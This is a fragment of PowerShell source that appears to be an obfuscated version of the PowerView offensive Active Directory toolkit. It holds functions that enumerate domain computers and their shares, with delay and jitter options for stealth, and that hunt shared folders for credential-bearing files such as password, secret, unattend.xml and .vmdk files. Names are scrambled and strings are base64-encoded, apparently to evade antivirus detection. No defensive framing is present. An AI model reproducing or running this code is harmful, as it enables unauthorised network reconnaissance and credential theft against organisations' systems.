        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${ca0e0dbccca747a0b83a2af44d4d9165} = ${ac645935110b4eaea96e7bf6f0b2d7f4}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABRAHUAZQByAHkAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
            ${ca0e0dbccca747a0b83a2af44d4d9165} = cec1def5409041f78ed8ecd436f7fa52 @f613cdfca6cd4ec9830841a185fa0248 | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $(${ca0e0dbccca747a0b83a2af44d4d9165}.Length)"
        if (${ca0e0dbccca747a0b83a2af44d4d9165}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABOAG8AIABoAG8AcwB0AHMAIABmAG8AdQBuAGQAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
        }
        ${91e68d106c5344ba911e56802fc167ea} = {
            Param(${ac645935110b4eaea96e7bf6f0b2d7f4}, $CheckShareAccess, ${d4e1296b557440d7b406a9378e307719})
            if (${d4e1296b557440d7b406a9378e307719}) {
                $Null = cb88cae78c7042af8720773b18453f4d -d4e1296b557440d7b406a9378e307719 ${d4e1296b557440d7b406a9378e307719} -e63bcfc245bf4c15941e2e6d5c906ee3
            }
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
                ${d7b577ae558c406581a98832155768ff} = Test-Connection -Count 1 -Quiet -ComputerName ${f54716d2d17141569e4a6cfb0d93653b}
                if (${d7b577ae558c406581a98832155768ff}) {
                    ${9b49132077e940f9847a8002ca6e3c03} = bc2b811be1804f37b3e4bed481ef34b0 -ac645935110b4eaea96e7bf6f0b2d7f4 ${f54716d2d17141569e4a6cfb0d93653b}
                    ForEach (${2b17e1b109e5462d9830997612cc8a23} in ${9b49132077e940f9847a8002ca6e3c03}) {
                        ${97bac7cbd4fa46e5af613759a2528d21} = ${2b17e1b109e5462d9830997612cc8a23}.Name
                        $Path = '\\'+${f54716d2d17141569e4a6cfb0d93653b}+'\'+${97bac7cbd4fa46e5af613759a2528d21}
                        if ((${97bac7cbd4fa46e5af613759a2528d21}) -and (${97bac7cbd4fa46e5af613759a2528d21}.trim() -ne '')) {
                            if ($CheckShareAccess) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    ${2b17e1b109e5462d9830997612cc8a23}
                                }
                                catch {
                                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIABzAGgAYQByAGUAIABwAGEAdABoACAAJABQAGEAdABoACAAOgAgACQAXwA=')))
                                }
                            }
                            else {
                                ${2b17e1b109e5462d9830997612cc8a23}
                            }
                        }
                    }
                }
            }
            if (${d4e1296b557440d7b406a9378e307719}) {
                dcf0a8b111a84302b05d40b1db05338c
            }
        }
        ${9d861c835c924c73aa92c66fb935caca} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
            }
            else {
                ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential -e63bcfc245bf4c15941e2e6d5c906ee3
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainShare] Total number of hosts: $(${ca0e0dbccca747a0b83a2af44d4d9165}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABEAGUAbABhAHkAOgAgACQARABlAGwAYQB5ACwAIABKAGkAdAB0AGUAcgA6ACAAJABKAGkAdAB0AGUAcgA=')))
            ${521aceac22ed4af69dedda38f567c0ac} = 0
            ${6c074dff13fb478aa365aea23a93e2d2} = New-Object System.Random
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ca0e0dbccca747a0b83a2af44d4d9165}) {
                ${521aceac22ed4af69dedda38f567c0ac} = ${521aceac22ed4af69dedda38f567c0ac} + 1
                Start-Sleep -Seconds ${6c074dff13fb478aa365aea23a93e2d2}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainShare] Enumerating server ${f54716d2d17141569e4a6cfb0d93653b} (${521aceac22ed4af69dedda38f567c0ac} of $(${ca0e0dbccca747a0b83a2af44d4d9165}.count))"
                Invoke-Command -ScriptBlock ${91e68d106c5344ba911e56802fc167ea} -ArgumentList ${f54716d2d17141569e4a6cfb0d93653b}, $CheckShareAccess, ${9d861c835c924c73aa92c66fb935caca}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABVAHMAaQBuAGcAIAB0AGgAcgBlAGEAZABpAG4AZwAgAHcAaQB0AGgAIAB0AGgAcgBlAGEAZABzADoAIAAkAFQAaAByAGUAYQBkAHMA')))
            ${96683e5d4de842f184dbc8ff33d066b2} = @{
                'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' = ${9d861c835c924c73aa92c66fb935caca}
            }
            afa7981a0a8840e7ae58b8e0c696a5d3 -ac645935110b4eaea96e7bf6f0b2d7f4 ${ca0e0dbccca747a0b83a2af44d4d9165} -d8bca3485d0e4462855c0f18d0a8d91d ${91e68d106c5344ba911e56802fc167ea} -bf25cd70880740848c7344c3829474ee ${96683e5d4de842f184dbc8ff33d066b2} -Threads $Threads
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function Find-InterestingDomainShareFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAYwByAGUAdAAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $SharePath,
        [String[]]
        $ExcludedShares = @('C$', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0ACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA=')))),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${f613cdfca6cd4ec9830841a185fa0248} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${de1879a6375144efa1511357bfecd42f} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${b0dd23003b9d4473818f6e8c6cc2e082} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${ca0e0dbccca747a0b83a2af44d4d9165} = ${ac645935110b4eaea96e7bf6f0b2d7f4}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABRAHUAZQByAHkAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
            ${ca0e0dbccca747a0b83a2af44d4d9165} = cec1def5409041f78ed8ecd436f7fa52 @f613cdfca6cd4ec9830841a185fa0248 | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $(${ca0e0dbccca747a0b83a2af44d4d9165}.Length)"
        if (${ca0e0dbccca747a0b83a2af44d4d9165}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABOAG8AIABoAG8AcwB0AHMAIABmAG8AdQBuAGQAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
        }
        ${91e68d106c5344ba911e56802fc167ea} = {
            Param(${ac645935110b4eaea96e7bf6f0b2d7f4}, $Include, $ExcludedShares, $OfficeDocs, ${aedc8c7c653d42d7a0d36c98fc095805}, $FreshEXEs, ${b6ee2a9df5944cd78701f8b47e04e753}, ${d4e1296b557440d7b406a9378e307719})
            if (${d4e1296b557440d7b406a9378e307719}) {
                $Null = cb88cae78c7042af8720773b18453f4d -d4e1296b557440d7b406a9378e307719 ${d4e1296b557440d7b406a9378e307719} -e63bcfc245bf4c15941e2e6d5c906ee3
            }
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
                ${c219f99d6de146139bac63ac9ea29821} = @()
                if (${f54716d2d17141569e4a6cfb0d93653b}.StartsWith('\\')) {
                    ${c219f99d6de146139bac63ac9ea29821} += ${f54716d2d17141569e4a6cfb0d93653b}
                }
                else {
                    ${d7b577ae558c406581a98832155768ff} = Test-Connection -Count 1 -Quiet -ComputerName ${f54716d2d17141569e4a6cfb0d93653b}
                    if (${d7b577ae558c406581a98832155768ff}) {
                        ${9b49132077e940f9847a8002ca6e3c03} = bc2b811be1804f37b3e4bed481ef34b0 -ac645935110b4eaea96e7bf6f0b2d7f4 ${f54716d2d17141569e4a6cfb0d93653b}
                        ForEach (${2b17e1b109e5462d9830997612cc8a23} in ${9b49132077e940f9847a8002ca6e3c03}) {
                            ${97bac7cbd4fa46e5af613759a2528d21} = ${2b17e1b109e5462d9830997612cc8a23}.Name
                            $Path = '\\'+${f54716d2d17141569e4a6cfb0d93653b}+'\'+${97bac7cbd4fa46e5af613759a2528d21}
                            if ((${97bac7cbd4fa46e5af613759a2528d21}) -and (${97bac7cbd4fa46e5af613759a2528d21}.Trim() -ne '')) {
                                if ($ExcludedShares -NotContains ${97bac7cbd4fa46e5af613759a2528d21}) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        ${c219f99d6de146139bac63ac9ea29821} += $Path
                                    }
                                    catch {
                                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIABhAGMAYwBlAHMAcwAgAHQAbwAgACQAUABhAHQAaAA=')))
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach (${2b17e1b109e5462d9830997612cc8a23} in ${c219f99d6de146139bac63ac9ea29821}) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABzAGgAYQByAGUAOgAgACQAewAyAGIAMQA3AGUAMQBiADEAMAA5AGUANQA0ADYAMgBkADkAOAAzADAAOQA5ADcANgAxADIAYwBjADgAYQAyADMAfQA=')))
                    ${857afa63766740b18267b45ad8ab9a0c} = @{
                        'Path' = ${2b17e1b109e5462d9830997612cc8a23}
                        'Include' = $Include
                    }
                    if ($OfficeDocs) {
                        ${857afa63766740b18267b45ad8ab9a0c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAaQBjAGUARABvAGMAcwA=')))] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        ${857afa63766740b18267b45ad8ab9a0c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGUAcwBoAEUAWABFAHMA')))] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        ${857afa63766740b18267b45ad8ab9a0c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABBAGMAYwBlAHMAcwBUAGkAbQBlAA==')))] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        ${857afa63766740b18267b45ad8ab9a0c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        ${857afa63766740b18267b45ad8ab9a0c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] = $CreationTime
                    }
                    if (${b6ee2a9df5944cd78701f8b47e04e753}) {
                        ${857afa63766740b18267b45ad8ab9a0c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] = ${b6ee2a9df5944cd78701f8b47e04e753}
                    }
                    e688f334e90c44fe87244254417a3ffa @857afa63766740b18267b45ad8ab9a0c
                }
            }
            if (${d4e1296b557440d7b406a9378e307719}) {
                dcf0a8b111a84302b05d40b1db05338c
            }
        }
        ${9d861c835c924c73aa92c66fb935caca} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
            }
            else {
                ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential -e63bcfc245bf4c15941e2e6d5c906ee3
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $(${ca0e0dbccca747a0b83a2af44d4d9165}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABEAGUAbABhAHkAOgAgACQARABlAGwAYQB5ACwAIABKAGkAdAB0AGUAcgA6ACAAJABKAGkAdAB0AGUAcgA=')))
            ${521aceac22ed4af69dedda38f567c0ac} = 0
            ${6c074dff13fb478aa365aea23a93e2d2} = New-Object System.Random
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ca0e0dbccca747a0b83a2af44d4d9165}) {
                ${521aceac22ed4af69dedda38f567c0ac} = ${521aceac22ed4af69dedda38f567c0ac} + 1
                Start-Sleep -Seconds ${6c074dff13fb478aa365aea23a93e2d2}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server ${f54716d2d17141569e4a6cfb0d93653b} (${521aceac22ed4af69dedda38f567c0ac} of $(${ca0e0dbccca747a0b83a2af44d4d9165}.count))"
                Invoke-Command -ScriptBlock ${91e68d106c5344ba911e56802fc167ea} -ArgumentList ${f54716d2d17141569e4a6cfb0d93653b}, $Include, $ExcludedShares, $OfficeDocs, ${aedc8c7c653d42d7a0d36c98fc095805}, $FreshEXEs, ${b6ee2a9df5944cd78701f8b47e04e753}, ${9d861c835c924c73aa92c66fb935caca}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABVAHMAaQBuAGcAIAB0AGgAcgBlAGEAZABpAG4AZwAgAHcAaQB0AGgAIAB0AGgAcgBlAGEAZABzADoAIAAkAFQAaAByAGUAYQBkAHMA')))
            ${96683e5d4de842f184dbc8ff33d066b2} = @{
                'Include' = $Include
                'ExcludedShares' = $ExcludedShares
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = ${aedc8c7c653d42d7a0d36c98fc095805}
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = ${b6ee2a9df5944cd78701f8b47e04e753}
                'TokenHandle' = ${9d861c835c924c73aa92c66fb935caca}
            }
            afa7981a0a8840e7ae58b8e0c696a5d3 -ac645935110b4eaea96e7bf6f0b2d7f4 ${ca0e0dbccca747a0b83a2af44d4d9165} -d8bca3485d0e4462855c0f18d0a8d91d ${91e68d106c5344ba911e56802fc167ea} -bf25cd70880740848c7344c3829474ee ${96683e5d4de842f184dbc8ff33d066b2} -Threads $Threads
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function Find-LocalAdminAccess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Switch]
        $CheckShareAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
